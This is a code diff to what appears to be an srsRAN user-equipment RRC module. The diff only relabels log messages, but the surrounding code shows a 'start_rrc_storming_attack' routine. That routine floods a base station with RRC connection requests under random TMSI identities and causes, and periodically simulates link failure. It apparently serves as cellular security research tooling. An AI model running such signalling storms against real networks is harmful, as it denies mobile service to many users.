@@ -3038,13 +3038,13 @@ void rrc::nr_scg_failure_information(const scg_failure_cause_t cause)
 
 void rrc::start_rrc_storming_attack()
 {
-  logger.info("Starting RRC Storming Attack...");
+  logger.info("[RRC_STORM] Starting RRC Storming Attack...");
   
   // Attack parameters from config
   const int max_attacks = args.rrc_storming_max_attacks;  // Maximum number of attacks
   const int attack_interval_ms = args.rrc_storming_interval_ms;  // Interval between attacks (ms)
   
-  logger.info("RRC Storming Attack Config: max_attacks=%d, interval_ms=%d", max_attacks, attack_interval_ms);
+  logger.info("[RRC_STORM] Attack Config: max_attacks=%d, interval_ms=%d", max_attacks, attack_interval_ms);
   
   std::random_device rd;
   std::mt19937 gen(rd());
@@ -3064,7 +3064,7 @@ void rrc::start_rrc_storming_attack()
       // Generate random establishment cause
       srsran::establishment_cause_t cause = static_cast<srsran::establishment_cause_t>(cause_dist(gen));
       
-      logger.info("RRC Storm Attack #%d: TMSI=0x%08x, MMEC=0x%02x, Cause=%d", 
+      logger.info("[RRC_STORM] Attack #%d: TMSI=0x%08x, MMEC=0x%02x, Cause=%d", 
                  attack_count + 1, random_tmsi.m_tmsi, random_tmsi.mmec, (int)cause);
       
       // Set the random UE identity
@@ -3080,9 +3080,9 @@ void rrc::start_rrc_storming_attack()
         
         // Send connection request
         if (connection_request(cause, std::move(nas_msg))) {
-          logger.info("RRC Connection Request sent successfully");
+          logger.info("[RRC_STORM] Connection Request sent successfully");
         } else {
-          logger.warning("Failed to send RRC Connection Request");
+          logger.warning("[RRC_STORM] Failed to send Connection Request");
         }
       }
       
@@ -3093,19 +3093,19 @@ void rrc::start_rrc_storming_attack()
       
       // Simulate going back to idle state by triggering RLF
       if (attack_count % 10 == 0) {
-        logger.info("Simulating RLF to return to idle state");
+        logger.info("[RRC_STORM] Simulating RLF to return to idle state");
         simulate_rlf.store(true, std::memory_order_relaxed);
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
         simulate_rlf.store(false, std::memory_order_relaxed);
       }
       
     } catch (const std::exception& e) {
-      logger.error("Exception in RRC storming attack: %s", e.what());
+      logger.error("[RRC_STORM] Exception in attack: %s", e.what());
       break;
     }
   }
   
-  logger.info("RRC Storming Attack completed. Total attacks: %d", attack_count);
+  logger.info("[RRC_STORM] Attack completed. Total attacks: %d", attack_count);
 }
 
 } // namespace srsue
